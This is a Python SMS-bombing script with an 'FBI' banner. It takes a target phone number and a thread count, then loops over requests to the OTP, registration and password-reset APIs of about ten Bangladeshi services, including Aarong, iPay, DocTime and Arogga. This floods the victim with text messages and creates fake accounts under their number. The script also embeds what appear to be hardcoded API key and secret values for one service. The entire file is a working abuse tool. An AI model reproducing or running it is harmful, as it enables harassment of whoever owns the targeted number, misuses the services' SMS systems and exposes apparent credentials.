import requests
import json
import secrets
import random
import os


def banner():
    os.system('echo "$(tput setaf 1)==================================================================================================  $(tput sgr 0)"')
    os.system('echo "$(tput setaf 1)||$(tput sgr 0)$(tput setaf 4)                     FFFFFFFFFF           BB              IIIIIII       $(tput sgr 0)                     $(tput setaf 1) ||$(tput sgr 0)"')
    os.system('echo "$(tput setaf 1)||$(tput sgr 0)$(tput setaf 4)                     F                    B  B               I          $(tput sgr 0)                     $(tput setaf 1) ||$(tput sgr 0)"')
    os.system('echo "$(tput setaf 1)||$(tput sgr 0)$(tput setaf 4)                     F                    B    B             I          $(tput sgr 0)                     $(tput setaf 1) ||$(tput sgr 0)"')
    os.system('echo "$(tput setaf 1)||$(tput sgr 0)$(tput setaf 4)                     F                    B  B               I          $(tput sgr 0)                     $(tput setaf 1) ||$(tput sgr 0)"')
    os.system('echo "$(tput setaf 1)||$(tput sgr 0)$(tput setaf 4)                     FFFFFFFFFF           BB                 I          $(tput sgr 0)                     $(tput setaf 1) ||$(tput sgr 0)"')
    os.system('echo "$(tput setaf 1)||$(tput sgr 0)$(tput setaf 4)                     F                    B  B               I          $(tput sgr 0)                     $(tput setaf 1) ||$(tput sgr 0)"')
    os.system('echo "$(tput setaf 1)||$(tput sgr 0)$(tput setaf 4)                     F                    B   B              I          $(tput sgr 0)                     $(tput setaf 1) ||$(tput sgr 0)"')
    os.system('echo "$(tput setaf 1)||$(tput sgr 0)$(tput setaf 4)                     F                    B  B               I      $(tput sgr 0)$(tput setaf 6)This is FBI$(tput sgr 0)              $(tput setaf 1) ||$(tput sgr 0)"')
    os.system('echo "$(tput setaf 1)||$(tput sgr 0)$(tput setaf 4)                     F                    BB              IIIIIII   $(tput sgr 0)$(tput setaf 6)Auntyr Chele Dorja Khol$(tput sgr 0)  $(tput setaf 1) ||$(tput sgr 0)"')
    os.system('echo "$(tput setaf 1)==================================================================================================$(tput sgr 0)"')
    os.system('echo "               $(tput setaf 6)|$(tput sgr 0)  Developed By      :   N1GHTMAR3                          $(tput setaf 6)|$(tput sgr 0)"')
    os.system('echo "               $(tput setaf 6)|$(tput sgr 0)  Github            :   https://github.com/n1ghtmar3-6251  $(tput setaf 6)|$(tput sgr 0)"')
    os.system('echo "               $(tput setaf 6)|$(tput sgr 0)  Telegram ID       :   https://t.me/n1ghtmar3_2421        $(tput setaf 6)|$(tput sgr 0)"')
    os.system('echo "               $(tput setaf 6)|$(tput sgr 0)  Discord Channel   :   https://discord.gg/4yFfKr2r        $(tput setaf 6)|$(tput sgr 0)"')
    os.system('echo "               $(tput setaf 6)|===========================================================|$(tput sgr 0)"')

banner()


phone_number = input("YOUR MOBILE NUMBER HERE like 01..... : ");
thread = input("Threads Number : ");
threads = int(thread);

def ndub_account_creator(number):
    url = "https://admission.ndub.edu.bd/api/users/register-step-1/"
    gen_random_email = f"{secrets.token_hex(8)}@gmail.com"
    payload = json.dumps({
        "name": "Hackinag maurf",
        "email": f"{gen_random_email}",
        "phone": f"{number}",
        "password": "lrzmdyewulhyeut@spacehotline.com",
        "confirmPassword": "lrzmdyewulhyeut@spacehotline.com"
    })
    headers = {
        'Content-Type': 'application/json'
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    if response.status_code == 200:
        return True
    else:
        return False


def ndub_sms_sender(number):

    url = "https://admission.ndub.edu.bd/api/users/reset/"

    payload = json.dumps({
        "phone": f"{number}"
    })
    headers = {
        'User-Agent': 'ddaadad',
        'Content-Type': 'application/json'
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    if response.status_code == 200:
        return True
    else:
        return False


def easy_bd_sender(number):
    gen_random_email = f"{secrets.token_hex(8)}@gmail.com"
    burp0_url = "https://core.easy.com.bd:443/api/v1/registration"
    burp0_headers = {"Device-Key": f"{secrets.token_hex(8)}a0a9ecac04", "Lang": "en", "Content-Type": "application/x-www-form-urlencoded",
                     "Accept-Encoding": "gzip, deflate", "User-Agent": "okhttp/4.9.1", "Connection": "close"}
    burp0_data = {"password_confirmation": "dark1234", "name": "DARK",
                  "email": f"{secrets.token_hex(8)}a@gmail.com", "password": "dark1234", "mobile": f"{number}", "referrer_key": ''}
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


def truck_lagbe_owner(number):

    url = "https://tethys.trucklagbe.com/tl_gateway/tl_login/108/loginWithPhoneNo"

    payload = json.dumps({
        "userType": "owner",
        "phoneNo": f"{number}",
        "deviceId": f"{secrets.token_hex(8)}a456ac1830"
    })
    headers = {
        'Lat': '42.121212',
        'Lng': '12131.3131',
        'Source': 'gps',
        'Content-Type': 'application/json'
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    if response.status_code == 200:
        return True
    else:
        return False


def truck_lagbe_shipper(number):

    url = "https://tethys.trucklagbe.com/tl_gateway/tl_login/108/loginWithPhoneNo"

    payload = json.dumps({
        "userType": "shipper",
        "phoneNo": f"{number}",
        "deviceId": f"{secrets.token_hex(8)}a456ac1830"
    })
    headers = {
        'Lat': '42.121212',
        'Lng': '12131.3131',
        'Source': 'gps',
        'Content-Type': 'application/json'
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    if response.status_code == 200:
        return True
    else:
        return False


def i_pay_sender(number):

    burp0_url = "https://app.ipay.com.bd:443/api/v1/signup/v2"
    burp0_headers = {"User-Agent": "mobile-android", "Accept": "application/json", "Token": "",
                     "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate"}
    burp0_json = {"accountType": 1, "deviceId": f"mobile-androiad-G01a1A-d23825f{secrets.token_hex(8)}b6aa4ac830",
                  "mobileNumber": f"+88{number}"}
    response = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
    if response.status_code == 200:
        return True
    else:
        return False


def arong_acc_creator(number):
    burp0_url = "https://www.aarong.com:443/rest/default/V1/customers/userreg"
    burp0_headers = {"Device-Id": f"{secrets.token_hex(8)}b6aa4ac830", "Content-Type": "application/json; charset=UTF-8",
                     "Accept-Encoding": "gzip, deflate", "User-Agent": "okhttp/4.9.0"}
    burp0_json = {"dob": "24-08-2006", "email": f"{secrets.token_hex(8)}asd11a3a@gmai.ocm", "firstname": "NAIS",
                  "gender": "2", "lastname": "Tewr", "mobile": f"{number}", "password": "asaaasadasd"}
    res1 = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)


def arrong_sender(number):
    rand = random.randint(31131, 41414141414)
    burp0_url = "https://www.aarong.com:443/rest/default/V1/login"
    burp0_headers = {"Device-Id": f"d23825b{rand}6aa{rand}4ac830", "Content-Type": "application/json; charset=UTF-8",
                     "Accept-Encoding": "gzip, deflate", "User-Agent": "okhttp/4.9.0"}
    burp0_json = {"type": "phone", "username": f"{number}"}
    response1 = requests.post(
        burp0_url, headers=burp0_headers, json=burp0_json).json()
    customer_id = response1['customer'][0]['customer_id']
    sms_sender_arrong(customer_id)


def sms_sender_arrong(id_a):
    burp0_url = "https://www.aarong.com:443/rest/default/V1/customers/resendOtp"
    burp0_headers = {"Device-Id": f"{secrets.token_hex(8)}5b6aa4ac830", "Content-Type": "application/json; charset=UTF-8",
                     "Accept-Encoding": "gzip, deflate", "User-Agent": "okhttp/4.9.0"}
    burp0_json = {"customer_id": f"{id_a}"}
    response = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
    if response.status_code == 200:
        return True
    else:
        return False


def dakter_bhai_sms_sender(number):

    burp0_url = f"https://api.daktarbhai.com:443/api/v2/otp/generate?&api_key=BUFWICFGGNILMSLIYUVE&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVH&mobile=%2B88{number}&platform=app&activity=login"
    burp0_headers = {"Accept": "application/json", "Accept-Encoding": "gzip, deflate",
                     "User-Agent": "okhttp/4.9.0", "Connection": "close"}
    requests.post(burp0_url, headers=burp0_headers)


def doc_time(number):

    burp0_url = "https://api.doctime.com.bd:443/api/authenticate"
    burp0_headers = {"Accept": "application/json", "Authorization": "", "App-Version": "0.17.24", "Device-Brand": "google", "Platform": "Android", "Ads-Id": "e227c640-4caasas1-4e42-8LLLLLLLLLLLLLLL19e-3784076cdb37", "Device-Model": "G011A",
                     "Device-Token": f"{secrets.token_hex(8)}aMVHcF2-f:xaxaAPA91bHM3esxaxaxax1k3-aYCNJb1qYV6UDXj7m3xfee8dhSYmCfGh1mGoyJSKKnq4CftZ-SBFzS8P-JfsnXvgEW73CBt8iMCqNPkbVrBBWOC4DW9O6fyVmFg-C3_Oz3qRAbXCPgecrrFRT1nx2qlUA", "Os-Version": "7.1.2", "Device-Id": "6e8deasasadassa20a9ecac04", "Locale": "bn", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "okhttp/4.9.0"}
    burp0_json = {"contact_no": f"{number}", "country_calling_code": "88"}
    requests.post(burp0_url, headers=burp0_headers, json=burp0_json)


def aroggo_sender(number):

    burp0_url = "https://api.arogga.com:443/v1/auth/sms/send?f=app&v=4.4.3&os=android&osv=25"
    burp0_headers = {"Content-Type": "application/x-www-form-urlencoded",
                     "Accept-Encoding": "gzip, deflate", "User-Agent": "okhttp/4.9.2"}
    burp0_data = {"mobile": f"{number}", "fcmToken": "abir", "referral": ''}
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


def oshud_potro(number):

    burp0_url = "https://api-4.osudpotro.com:443/v7/users/send_otp"
    burp0_headers = {"Content-Type": "application/x-www-form-urlencoded",
                     "Accept-Encoding": "gzip, deflate", "User-Agent": "okhttp/3.14.9"}
    burp0_data = {"mobile": f"+88-{number}", "deviceToken": f"{secrets.token_hex(8)}aGC04pOtU6MdF:APA91bG02HDtgBvfyOfNZtmVoZh2z9cqf8Kb715z3_RHWbxs8_3Lzf2jmkRtLasaD4Z2Ab8LGzX_kNqWqLzfMI302FMXQ2Bzt9b6wVMKcGdg-BwdGuaruEVG046oMh8e0ZhVIhjo_vvGbhM",
                  "language": "en", "os": "android", "device_id": f"{secrets.token_hex(8)}a3-3cf3-b3sas85-dedd17fea483", "referral_id": ''}
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

#ndub_account_creator(phone_number);
for i in range(threads):
	ndub_account_creator(phone_number);
	ndub_sms_sender(phone_number);
	oshud_potro(phone_number);
	easy_bd_sender(phone_number);
	truck_lagbe_owner(phone_number);
	truck_lagbe_shipper(phone_number);
	i_pay_sender(phone_number);
	arong_acc_creator(phone_number);
	arrong_sender(phone_number);
	dakter_bhai_sms_sender(phone_number);
	doc_time(phone_number);
	aroggo_sender(phone_number);
